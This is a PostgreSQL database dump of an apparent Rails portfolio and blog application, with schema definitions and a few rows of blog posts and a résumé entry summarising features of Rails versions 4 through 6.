--
-- PostgreSQL database dump
--

-- Dumped from database version 13.4 (Ubuntu 13.4-1.pgdg20.04+1)
-- Dumped by pg_dump version 13.2

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

SET default_tablespace = '';

SET default_table_access_method = heap;

--
-- Name: action_text_highlighted_code_blocks; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.action_text_highlighted_code_blocks (
    id bigint NOT NULL,
    content text,
    language character varying,
    rich_text_id bigint,
    created_at timestamp(6) without time zone NOT NULL,
    updated_at timestamp(6) without time zone NOT NULL
);


ALTER TABLE public.action_text_highlighted_code_blocks OWNER TO gmialtjawlwvvw;

--
-- Name: action_text_highlighted_code_blocks_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.action_text_highlighted_code_blocks_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.action_text_highlighted_code_blocks_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: action_text_highlighted_code_blocks_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.action_text_highlighted_code_blocks_id_seq OWNED BY public.action_text_highlighted_code_blocks.id;


--
-- Name: action_text_rich_texts; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.action_text_rich_texts (
    id bigint NOT NULL,
    name character varying NOT NULL,
    body text,
    record_type character varying NOT NULL,
    record_id bigint NOT NULL,
    created_at timestamp(6) without time zone NOT NULL,
    updated_at timestamp(6) without time zone NOT NULL
);


ALTER TABLE public.action_text_rich_texts OWNER TO gmialtjawlwvvw;

--
-- Name: action_text_rich_texts_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.action_text_rich_texts_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.action_text_rich_texts_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: action_text_rich_texts_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.action_text_rich_texts_id_seq OWNED BY public.action_text_rich_texts.id;


--
-- Name: active_storage_attachments; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.active_storage_attachments (
    id bigint NOT NULL,
    name character varying NOT NULL,
    record_type character varying NOT NULL,
    record_id bigint NOT NULL,
    blob_id bigint NOT NULL,
    created_at timestamp without time zone NOT NULL
);


ALTER TABLE public.active_storage_attachments OWNER TO gmialtjawlwvvw;

--
-- Name: active_storage_attachments_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.active_storage_attachments_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.active_storage_attachments_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: active_storage_attachments_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.active_storage_attachments_id_seq OWNED BY public.active_storage_attachments.id;


--
-- Name: active_storage_blobs; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.active_storage_blobs (
    id bigint NOT NULL,
    key character varying NOT NULL,
    filename character varying NOT NULL,
    content_type character varying,
    metadata text,
    service_name character varying NOT NULL,
    byte_size bigint NOT NULL,
    checksum character varying NOT NULL,
    created_at timestamp without time zone NOT NULL
);


ALTER TABLE public.active_storage_blobs OWNER TO gmialtjawlwvvw;

--
-- Name: active_storage_blobs_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.active_storage_blobs_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.active_storage_blobs_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: active_storage_blobs_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.active_storage_blobs_id_seq OWNED BY public.active_storage_blobs.id;


--
-- Name: active_storage_variant_records; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.active_storage_variant_records (
    id bigint NOT NULL,
    blob_id bigint NOT NULL,
    variation_digest character varying NOT NULL
);


ALTER TABLE public.active_storage_variant_records OWNER TO gmialtjawlwvvw;

--
-- Name: active_storage_variant_records_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.active_storage_variant_records_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.active_storage_variant_records_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: active_storage_variant_records_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.active_storage_variant_records_id_seq OWNED BY public.active_storage_variant_records.id;


--
-- Name: ar_internal_metadata; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.ar_internal_metadata (
    key character varying NOT NULL,
    value character varying,
    created_at timestamp(6) without time zone NOT NULL,
    updated_at timestamp(6) without time zone NOT NULL
);


ALTER TABLE public.ar_internal_metadata OWNER TO gmialtjawlwvvw;

--
-- Name: bookmarks; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.bookmarks (
    id bigint NOT NULL,
    bookmarkable_type character varying,
    bookmarkable_id integer,
    user_id bigint,
    created_at timestamp(6) without time zone NOT NULL,
    updated_at timestamp(6) without time zone NOT NULL
);


ALTER TABLE public.bookmarks OWNER TO gmialtjawlwvvw;

--
-- Name: bookmarks_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.bookmarks_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.bookmarks_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: bookmarks_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.bookmarks_id_seq OWNED BY public.bookmarks.id;


--
-- Name: experiences; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.experiences (
    id bigint NOT NULL,
    company character varying NOT NULL,
    location character varying,
    title character varying NOT NULL,
    description character varying,
    start_date date NOT NULL,
    end_date date,
    working_here boolean DEFAULT false,
    user_id bigint,
    created_at timestamp(6) without time zone NOT NULL,
    updated_at timestamp(6) without time zone NOT NULL,
    avatar character varying,
    company_link character varying,
    company_heading character varying,
    image_url character varying
);


ALTER TABLE public.experiences OWNER TO gmialtjawlwvvw;

--
-- Name: experiences_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.experiences_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.experiences_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: experiences_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.experiences_id_seq OWNED BY public.experiences.id;


--
-- Name: friendly_id_slugs; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.friendly_id_slugs (
    id bigint NOT NULL,
    slug character varying NOT NULL,
    sluggable_id integer NOT NULL,
    sluggable_type character varying(50),
    scope character varying,
    created_at timestamp without time zone
);


ALTER TABLE public.friendly_id_slugs OWNER TO gmialtjawlwvvw;

--
-- Name: friendly_id_slugs_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.friendly_id_slugs_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.friendly_id_slugs_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: friendly_id_slugs_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.friendly_id_slugs_id_seq OWNED BY public.friendly_id_slugs.id;


--
-- Name: item_images; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.item_images (
    id bigint NOT NULL,
    image character varying NOT NULL,
    caption character varying
);


ALTER TABLE public.item_images OWNER TO gmialtjawlwvvw;

--
-- Name: item_images_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.item_images_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.item_images_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: item_images_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.item_images_id_seq OWNED BY public.item_images.id;


--
-- Name: item_texts; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.item_texts (
    id bigint NOT NULL,
    description text NOT NULL
);


ALTER TABLE public.item_texts OWNER TO gmialtjawlwvvw;

--
-- Name: item_texts_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.item_texts_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.item_texts_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: item_texts_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.item_texts_id_seq OWNED BY public.item_texts.id;


--
-- Name: item_twitters; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.item_twitters (
    id bigint NOT NULL,
    twitter_id character varying NOT NULL
);


ALTER TABLE public.item_twitters OWNER TO gmialtjawlwvvw;

--
-- Name: item_twitters_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.item_twitters_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.item_twitters_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: item_twitters_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.item_twitters_id_seq OWNED BY public.item_twitters.id;


--
-- Name: items; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.items (
    id bigint NOT NULL,
    post_id bigint NOT NULL,
    sort_rank integer NOT NULL,
    target_type character varying NOT NULL,
    target_id bigint NOT NULL,
    created_at timestamp(6) without time zone NOT NULL,
    updated_at timestamp(6) without time zone NOT NULL
);


ALTER TABLE public.items OWNER TO gmialtjawlwvvw;

--
-- Name: items_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.items_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.items_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: items_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.items_id_seq OWNED BY public.items.id;


--
-- Name: likes; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.likes (
    id bigint NOT NULL,
    likeable_type character varying,
    likeable_id integer,
    user_id integer,
    created_at timestamp(6) without time zone NOT NULL,
    updated_at timestamp(6) without time zone NOT NULL
);


ALTER TABLE public.likes OWNER TO gmialtjawlwvvw;

--
-- Name: likes_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.likes_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.likes_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: likes_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.likes_id_seq OWNED BY public.likes.id;


--
-- Name: posts; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.posts (
    id bigint NOT NULL,
    title character varying,
    body text,
    likes_count integer DEFAULT 0,
    published_at timestamp without time zone,
    featured boolean DEFAULT false,
    picture character varying,
    created_at timestamp(6) without time zone NOT NULL,
    updated_at timestamp(6) without time zone NOT NULL,
    user_id bigint,
    slug character varying,
    responses_count integer DEFAULT 0 NOT NULL,
    lead text,
    meta_keywords character varying,
    meta_description character varying,
    language character varying,
    view_count integer DEFAULT 0
);


ALTER TABLE public.posts OWNER TO gmialtjawlwvvw;

--
-- Name: posts_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.posts_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.posts_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: posts_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.posts_id_seq OWNED BY public.posts.id;


--
-- Name: projects; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.projects (
    id bigint NOT NULL,
    title character varying NOT NULL,
    description text,
    image character varying,
    caption character varying,
    source_url character varying,
    accepted boolean DEFAULT false NOT NULL,
    user_id bigint NOT NULL,
    created_at timestamp(6) without time zone NOT NULL,
    updated_at timestamp(6) without time zone NOT NULL,
    sort integer,
    is_side boolean DEFAULT false,
    url character varying,
    team_size integer
);


ALTER TABLE public.projects OWNER TO gmialtjawlwvvw;

--
-- Name: projects_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.projects_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.projects_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: projects_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.projects_id_seq OWNED BY public.projects.id;


--
-- Name: responses; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.responses (
    id bigint NOT NULL,
    body text,
    post_id bigint,
    user_id bigint,
    created_at timestamp(6) without time zone NOT NULL,
    updated_at timestamp(6) without time zone NOT NULL,
    likes_count integer DEFAULT 0
);


ALTER TABLE public.responses OWNER TO gmialtjawlwvvw;

--
-- Name: responses_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.responses_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.responses_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: responses_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.responses_id_seq OWNED BY public.responses.id;


--
-- Name: schema_migrations; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.schema_migrations (
    version character varying NOT NULL
);


ALTER TABLE public.schema_migrations OWNER TO gmialtjawlwvvw;

--
-- Name: social_accounts; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.social_accounts (
    id bigint NOT NULL,
    user_id bigint NOT NULL,
    account_type integer NOT NULL,
    url character varying NOT NULL
);


ALTER TABLE public.social_accounts OWNER TO gmialtjawlwvvw;

--
-- Name: social_accounts_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.social_accounts_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.social_accounts_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: social_accounts_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.social_accounts_id_seq OWNED BY public.social_accounts.id;


--
-- Name: tag_relationships; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.tag_relationships (
    id bigint NOT NULL,
    tag_id integer NOT NULL,
    related_tag_id integer NOT NULL,
    relevance integer DEFAULT 0 NOT NULL,
    created_at timestamp(6) without time zone NOT NULL,
    updated_at timestamp(6) without time zone NOT NULL
);


ALTER TABLE public.tag_relationships OWNER TO gmialtjawlwvvw;

--
-- Name: tag_relationships_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.tag_relationships_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.tag_relationships_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: tag_relationships_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.tag_relationships_id_seq OWNED BY public.tag_relationships.id;


--
-- Name: taggings; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.taggings (
    id bigint NOT NULL,
    tag_id bigint NOT NULL,
    subject_type character varying NOT NULL,
    subject_id bigint NOT NULL,
    created_at timestamp(6) without time zone NOT NULL,
    updated_at timestamp(6) without time zone NOT NULL
);


ALTER TABLE public.taggings OWNER TO gmialtjawlwvvw;

--
-- Name: taggings_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.taggings_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.taggings_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: taggings_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.taggings_id_seq OWNED BY public.taggings.id;


--
-- Name: tags; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.tags (
    id bigint NOT NULL,
    name character varying NOT NULL,
    created_at timestamp(6) without time zone NOT NULL,
    updated_at timestamp(6) without time zone NOT NULL,
    featured boolean DEFAULT false,
    lowercase_name character varying,
    slug character varying
);


ALTER TABLE public.tags OWNER TO gmialtjawlwvvw;

--
-- Name: tags_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.tags_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.tags_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: tags_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.tags_id_seq OWNED BY public.tags.id;


--
-- Name: users; Type: TABLE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE TABLE public.users (
    id bigint NOT NULL,
    username character varying,
    email character varying DEFAULT ''::character varying NOT NULL,
    encrypted_password character varying DEFAULT ''::character varying NOT NULL,
    reset_password_token character varying,
    reset_password_sent_at timestamp without time zone,
    remember_created_at timestamp without time zone,
    sign_in_count integer DEFAULT 0 NOT NULL,
    current_sign_in_at timestamp without time zone,
    last_sign_in_at timestamp without time zone,
    current_sign_in_ip character varying,
    last_sign_in_ip character varying,
    created_at timestamp(6) without time zone NOT NULL,
    updated_at timestamp(6) without time zone NOT NULL,
    avatar character varying,
    description text,
    provider character varying,
    uid character varying,
    slug character varying,
    location character varying,
    first_name character varying,
    last_name character varying,
    linkedin character varying,
    github character varying,
    resume character varying,
    skills character varying,
    mobile character varying,
    hobbies character varying,
    languages character varying,
    show_linkedin_badge boolean DEFAULT false
);


ALTER TABLE public.users OWNER TO gmialtjawlwvvw;

--
-- Name: users_id_seq; Type: SEQUENCE; Schema: public; Owner: gmialtjawlwvvw
--

CREATE SEQUENCE public.users_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.users_id_seq OWNER TO gmialtjawlwvvw;

--
-- Name: users_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: gmialtjawlwvvw
--

ALTER SEQUENCE public.users_id_seq OWNED BY public.users.id;


--
-- Name: action_text_highlighted_code_blocks id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.action_text_highlighted_code_blocks ALTER COLUMN id SET DEFAULT nextval('public.action_text_highlighted_code_blocks_id_seq'::regclass);


--
-- Name: action_text_rich_texts id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.action_text_rich_texts ALTER COLUMN id SET DEFAULT nextval('public.action_text_rich_texts_id_seq'::regclass);


--
-- Name: active_storage_attachments id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.active_storage_attachments ALTER COLUMN id SET DEFAULT nextval('public.active_storage_attachments_id_seq'::regclass);


--
-- Name: active_storage_blobs id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.active_storage_blobs ALTER COLUMN id SET DEFAULT nextval('public.active_storage_blobs_id_seq'::regclass);


--
-- Name: active_storage_variant_records id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.active_storage_variant_records ALTER COLUMN id SET DEFAULT nextval('public.active_storage_variant_records_id_seq'::regclass);


--
-- Name: bookmarks id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.bookmarks ALTER COLUMN id SET DEFAULT nextval('public.bookmarks_id_seq'::regclass);


--
-- Name: experiences id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.experiences ALTER COLUMN id SET DEFAULT nextval('public.experiences_id_seq'::regclass);


--
-- Name: friendly_id_slugs id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.friendly_id_slugs ALTER COLUMN id SET DEFAULT nextval('public.friendly_id_slugs_id_seq'::regclass);


--
-- Name: item_images id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.item_images ALTER COLUMN id SET DEFAULT nextval('public.item_images_id_seq'::regclass);


--
-- Name: item_texts id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.item_texts ALTER COLUMN id SET DEFAULT nextval('public.item_texts_id_seq'::regclass);


--
-- Name: item_twitters id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.item_twitters ALTER COLUMN id SET DEFAULT nextval('public.item_twitters_id_seq'::regclass);


--
-- Name: items id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.items ALTER COLUMN id SET DEFAULT nextval('public.items_id_seq'::regclass);


--
-- Name: likes id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.likes ALTER COLUMN id SET DEFAULT nextval('public.likes_id_seq'::regclass);


--
-- Name: posts id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.posts ALTER COLUMN id SET DEFAULT nextval('public.posts_id_seq'::regclass);


--
-- Name: projects id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.projects ALTER COLUMN id SET DEFAULT nextval('public.projects_id_seq'::regclass);


--
-- Name: responses id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.responses ALTER COLUMN id SET DEFAULT nextval('public.responses_id_seq'::regclass);


--
-- Name: social_accounts id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.social_accounts ALTER COLUMN id SET DEFAULT nextval('public.social_accounts_id_seq'::regclass);


--
-- Name: tag_relationships id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.tag_relationships ALTER COLUMN id SET DEFAULT nextval('public.tag_relationships_id_seq'::regclass);


--
-- Name: taggings id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.taggings ALTER COLUMN id SET DEFAULT nextval('public.taggings_id_seq'::regclass);


--
-- Name: tags id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.tags ALTER COLUMN id SET DEFAULT nextval('public.tags_id_seq'::regclass);


--
-- Name: users id; Type: DEFAULT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.users ALTER COLUMN id SET DEFAULT nextval('public.users_id_seq'::regclass);


--
-- Data for Name: action_text_highlighted_code_blocks; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.action_text_highlighted_code_blocks (id, content, language, rich_text_id, created_at, updated_at) FROM stdin;
\.


--
-- Data for Name: action_text_rich_texts; Type: TABLE DATA; Schema: public; Owner: gmialtjawlwvvw
--

COPY public.action_text_rich_texts (id, name, body, record_type, record_id, created_at, updated_at) FROM stdin;
2	description	<ul><li>Developed &amp; maintained Microservices using Ruby on Rails, Google Cloud Platform, Docker which fetches and transforms data from sources like AS400 and Oracle.</li><li>Implement back-end services and Kubernetes jobs to schedule the background tasks related to SOLR indexing and data retrieval into PostgreSQL and backups. </li><li>Production support &amp; assist migration of a ROR, MongoDB based app from Rack servers to GCP.</li></ul>	Experience	1	2021-08-07 18:51:47.717445	2021-08-07 18:51:47.717445
1	body	<div>Rails 6 requires Ruby <strong>2.5+</strong></div><ul><li>Action Mailbox: Gives you the way for incoming emails to the mailboxes as a controller for processing in the rails application. Also, it has access to integrate Mailgun, Postmark, and SendGrid</li><li>Action Text: Trix editor is added. This editor handles everything from formatting, quotes, lists, and embedded images and galleries. Any embedded images or attachments are automatically stored using Active Storage</li><li><strong>Parallel Testing</strong>: Parallel testing allows you to run each test parallelly. It reduces the time to execute the test suite.</li><li>Action Cable Testing: Now it is possible to test Action Cable at any level: connections, channels, and broadcasts.</li><li>Optimizer Hints</li><li>Webpack: Previously Rails used Assets Pipeline to build JS and CSS. But now, using webpacker gem, all StyleSheets, images and JS libraries wrap into a single bundle with a single access point</li></ul>	Post	1	2021-08-07 12:40:39.500822	2021-08-07 20:22:36.009951
5	body	<ul><li><strong>Real-time data with ActionCable. </strong>ActionCable adds real-time features to Rails right out of the box. ActionCable leverages <a href="https://en.wikipedia.org/wiki/WebSocket">Websockets</a> to keep open connections between the user’s computer and the server. This way you can send data from your Rails server to all connected users and update whatever they see in their browser.</li><li>API Mode</li><li>Goodbye rake! : This means, for example, “rake db:migrate” is now “rails db:migrate”</li><li>Rails use <a href="http://puma.io/">Puma</a> as the default web server now instead of Webrick </li><li>Turbolinks 5 promises to load your pages much faster than before</li><li>ApplicationRecord has been born as a default parent class of all models created by the generators.</li></ul><div>Rails 4 requires Ruby 1.9.3 or higher and prefers Ruby 2.0 while Rails 5 only work with Ruby <strong>2.2.1</strong></div><div><br></div>	Post	2	2021-08-07 20:23:47.539646	2021-08-07 20:23:47.539646
7	body	<div>Rails provide many features like</div><ul><li><strong>Metaprogramming</strong>: Rails uses code generation but for heavy lifting, it relies on meta-programming. Ruby is considered one of the best languages for Metaprogramming.</li><li><strong>Active Record</strong>: It saves an object to the database through Active Record Framework. The Rails version of Active Record identifies the column in a schema and automatically binds them to your domain objects using metaprogramming</li><li><strong>Scaffolding</strong>: Rails have an ability to create scaffolding or temporary code automatically</li><li><strong>Convention over configuration</strong>: Unlike other development framework, Rails does not require many configurations, if you follow the naming convention carefully</li><li><strong>Three environments</strong>: Rails comes with three default environment testing, development, and production.</li><li><strong>Built-in-testing</strong>: It supports code called harness and fixtures that make test cases to write and execute.</li></ul>	Post	4	2021-08-07 20:25:55.55391	2021-08-07 20:25:55.55391
6	body	<ul>\n<li>The <strong>attr_accessible</strong> method in the model is gone, and indeed mass assignment in the "traditional" way of feeding unfiltered params to the model is taken out and put into a gem. Instead, you now use the <strong>permit</strong> and <strong>require</strong> methods</li>\n<li>Rails 4 is <a href="https://www.thoughtco.com/using-rvm-gemsets-2908241">thread-safe</a> by default. This should help performance on threaded HTTP servers where multiple requests can be handled by the same Ruby process. This doesn't mean all that much for the typical Rails application, but it does mean that you'll need to ensure all gems you use are thread-safe and all your application code keeps its state to itself. So if your application is touching any global variables or any class variables, then it may run into problems. </li>\n<li>\n<strong>Streaming</strong> is now supported via Rails. HTTP streaming is the process of doling out the response to a request over time, rather than all at once. </li>\n<li>ActionPack page and action caching (<a href="https://github.com/rails/rails/commit/b0a7068564f0c95e7ef28fc39d0335ed17d93e90">commit</a>) - Page and action caching are extracted to a separate gem. Page and action caching require too much manual intervention (manually expiring caches when the underlying model objects are updated). Instead, use Russian doll caching.</li>\n<li>Asset pipeline have been extracted to separate gem ‘<strong>sprocket-rails</strong>’</li>\n</ul><div><br></div>	Post	3	2021-08-07 20:25:23.641464	2021-08-09 07:11:03.349025
